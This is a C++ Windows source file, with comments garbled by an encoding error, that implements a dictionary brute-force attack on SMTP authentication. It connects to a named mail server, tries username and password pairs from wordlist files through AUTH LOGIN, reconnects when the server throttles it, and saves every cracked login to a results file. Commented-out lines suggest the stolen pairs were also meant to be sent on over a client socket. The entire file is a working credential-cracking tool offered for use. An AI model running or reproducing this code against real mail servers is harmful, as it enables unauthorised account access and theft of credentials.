#include <iostream>
#include <winsock2.h>
#include "base64.h"
#include "protocol.h"
#include "ClientSocket.h"
using namespace std;

#pragma comment(lib, "ws2_32.lib")

FILE *fpPass, *fpUser, *fpDomain, *fpResult;			// �ļ����������û����������ļ��������ƽ��ļ�ָ��
SOCKET sock;								// �׽���������
char send_wait(char *, char *, char);		// ��������:�������ݲ��ȴ�������Ӧ��
void usage();								// ����ʹ��˵��
void initialsocket();						// ��������
struct sockaddr_in destAddr;				// Ŀ�ĵ�ַ

class CClientSocket;

int smtp_bruteforce()
{
	WSADATA wsaData;			
	DWORD starttime;						// �������е���ʼʱ��
	struct hostent *host;					// ����ת��

	char *userFile = "user.txt";			// �û����ֵ��ļ�
	char *passFile = "password.txt"; 		// �����ֵ��ļ�·��
	char *domainFile = "maildomain.txt";	// �ʼ������б�
	char *resultFile = "result.txt";		// �����ƽ������ļ�

	char username[21];						// �û���
	char password[21];						// ����
	char mailDomain[51];					// �ʼ�����������

	int k = 0, i = 0, j = 0;				// �Ѷ�ȡ�����ļ�����
	char *ICMP_DEST_IP = "mail.starnight.com";						// DNS��ѯ����IP��ַ

	
	if(WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
	{
		printf("�׽��ְ汾Э�̳���!\n");
		WSACleanup();
		return 5;
	}
	
	// ��������, ��ȡ�ʼ�������IP��ַ
	host = gethostbyname(ICMP_DEST_IP);
	if(NULL == host)
	{
		printf("�޷���������%s��IP��ַ!\n", ICMP_DEST_IP);
		WSACleanup();
		return 6;
	} 
	else		// ʹ�û�ȡ���ĵ�һ��IP��ַ
	{
		ICMP_DEST_IP = inet_ntoa(*(struct in_addr*)host->h_addr_list[0]);
		printf("server ip : %s\n", ICMP_DEST_IP);
	}
	
	// ��дĿ�ĵ�ַ�ṹ��: Э�顢��ַ���˿�  SMTP:25
	memset(&destAddr, 0, sizeof(destAddr));
	destAddr.sin_family = AF_INET;
	destAddr.sin_addr.s_addr = inet_addr(ICMP_DEST_IP);  
	destAddr.sin_port = htons(25);
	
	// ��ֻ�����û����������ļ����ƽ�ɹ��Ľ��	
	fpUser = fopen(userFile, "r");
	fpDomain = fopen(domainFile, "r");
	fpResult = fopen(resultFile, "w+");


	if(NULL == fpUser || NULL == fpDomain || NULL == fpResult)
	{
		printf("open file failed, check whether these files exist : user.txt, password.txt, maildomin.txt\n");
		return -1;
	}

	initialsocket();					// ��ʼ��socket����
	starttime = GetTickCount();			// ��ȡ��ǰƫ��ʱ��

//	fgets(mailDomain, 50, fpDomain);

	memset(username, 0, sizeof(username));
	while(fgets(username, 20, fpUser))
	{
		j++;
		if(username[strlen(username)-1]==0x0A)
			username[strlen(username)-1]=0;

		memset(password, 0, sizeof(password));
		fpPass = fopen(passFile, "r");					// ���´��ļ�
		while (fgets(password, 20, fpPass))
		{
			k++;
			if(password[strlen(password)-1]==0x0A)
				password[strlen(password)-1]=0;
			printf("%d:%d username:%s \t password:%s\n", j, k, username, password);

			//����AUTH LOGIN����,���𵽽�����Ӧ��334
			if(send_wait("AUTH LOGIN", "334", 0) != 2)
				continue;

			if(send_wait(username, "334", 1) != 2)
				continue;

			if(send_wait(password, "235", 1) != 2)
				continue;
			else
			{
				printf("------------ find a pair ---------------\n");
				printf("username:%s \t password:%s\n", username, password);
				printf("----------------------------------------\n");

				int length = strlen(username) + strlen(password);
				char *info = new char[length + 2];
				memset(info, 0, length + 2);
				strncpy(info, username, strlen(username));
				strcat(info, ":");
				strcat(info, password);
				info[length+1] = '\0';
				fwrite(info, length + 1, 1, fpResult);
				fputc('\n', fpResult);
				//fclose(fpResult);
// 				CPacket packet(PACKET_COMMAND, HOST_HELLO, (LPBYTE)info, strlen(info));
// 				cs.Send();
				
				// ����quit��Ϣ���˳���¼״̬���ٳ�ʼ������
				if(send_wait("QUIT", "221", 0) != 2)
					printf("disconnected failed!!!\n");
				else
					printf("disconnected from remote mail server...\n");
				initialsocket();
		
				memset(username, 0, sizeof(username));
				fclose(fpPass);	
				break;						
			}
		}
	}

	// �����������ʱ�䣬�رմ򿪵��ļ����ر��׽��֣��������������
	printf("�������к�ʱ:%ds:%dms\n", ((GetTickCount()-starttime)) / 1000, ((GetTickCount()-starttime)) % 1000 );
	fclose(fpUser);
	fclose(fpDomain);
	fclose(fpResult);
	closesocket(sock);
	WSACleanup();

	return 0;
}


/**
** �������ݲ��ȴ�������Ӧ��
** ����˵��: command: ���͵���� responseCode: �ڴ����ܵ���Ӧ�롢 isEncode: �Ƿ���Ҫbase64����(1��ʾ��Ҫ,0��ʾ����Ҫ)
** ����ֵ: -1:����ʧ�ܡ� 0:�������ݳ��� 1:û�гɹ����յ���Ӧ�� �� 2:�ɹ����յ���Ӧ��	
*/
char send_wait(char *command, char *responseCode, char isEncode)
{
//	unsigned char *base64;
	char smtp_data[101];			// �ύ��SMTP������������
	char recvBuf[201];				// �������ݻ�����
	DWORD starttime;				// ��ʼʱ��
	memset(smtp_data, 0, sizeof(smtp_data));
	if(isEncode)		// ��Ҫ����base64����
	{
		std::string encoded = base64_encode(reinterpret_cast<const unsigned char*>((string(command).c_str())), string(command).length());
		printf("encode : %s\n", encoded.c_str());
		strcpy(smtp_data, encoded.c_str());
	} else
	{
		strcpy(smtp_data, command);
	}
	
	// ���ϻ��з�
	smtp_data[strlen(smtp_data)] = 0x0D;
	smtp_data[strlen(smtp_data)] = 0x0A;

	if(SOCKET_ERROR == send(sock, smtp_data, strlen(smtp_data), 0))
	{
		printf("�����������!\n");
		return -1;
	}
	memset(recvBuf, 0, sizeof(recvBuf));
	starttime = GetTickCount();
	while(1)
	{
		// ����2s�ĳ�ʱʱ��
		if(GetTickCount() - starttime > 2000)
		{
			printf("timeout...\n");
			return 0;
		}
		
		if(SOCKET_ERROR == recv(sock, recvBuf, 200, 0))
		{
			printf("������Ϣ����");
			return 0;
		}
		else 
		{
			printf("recvBuf:==# %s \n", recvBuf);
			if(NULL == strstr(recvBuf, responseCode))
			{
				if(strstr(recvBuf, "421") || strstr(recvBuf, "451"))
					initialsocket();			// ����socket����
				return 1;
			}
			else 
				return 2;
		}
	}
}


void initialsocket()
{
	char recvBuf[201];			// ���շ������������ݻ�����
	int timeout = 3000;
	closesocket(sock);
	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);			// �����׽���
	if(INVALID_SOCKET == sock)
	{
		printf("�����׽��ֳ���!\n");
		WSACleanup();
		exit(0);
	}
	
	// ����Ŀ������
	if(SOCKET_ERROR == connect(sock, (SOCKADDR*)&destAddr, sizeof(destAddr)))
	{
		printf("����Ŀ������ʧ��!.\n");
		closesocket(sock);
		WSACleanup();
		exit(0);
	}
	
	// ���ó�ʱʱ��
	if(SOCKET_ERROR == setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout)))
	{
		printf("�����׽��ֳ�ʱʧ��!.\n");
		closesocket(sock);
		WSACleanup();
		exit(0);
	}
	
	memset(recvBuf, 0, sizeof(recvBuf));
	if(SOCKET_ERROR == recv(sock, recvBuf, 200, 0))
	{
		printf("����������Ϣ����!.\n");
		closesocket(sock);
		WSACleanup();
		exit(0);
	}
	else {
		if(strstr(recvBuf, "554"))
		{
			printf("�÷������з������ƽ����ã�����IP��ַ����ʱ�������ӣ����Ժ�����...\n");
			printf("From SMTP Server : \n%s\n", recvBuf);
			closesocket(sock);
			WSACleanup();
			exit(0);
		}
	}
	// ����"EHLO starnight.com"������ڴ�������Ӧ��250
	send_wait("EHLO mail.starnight.com", "250", 0);
}


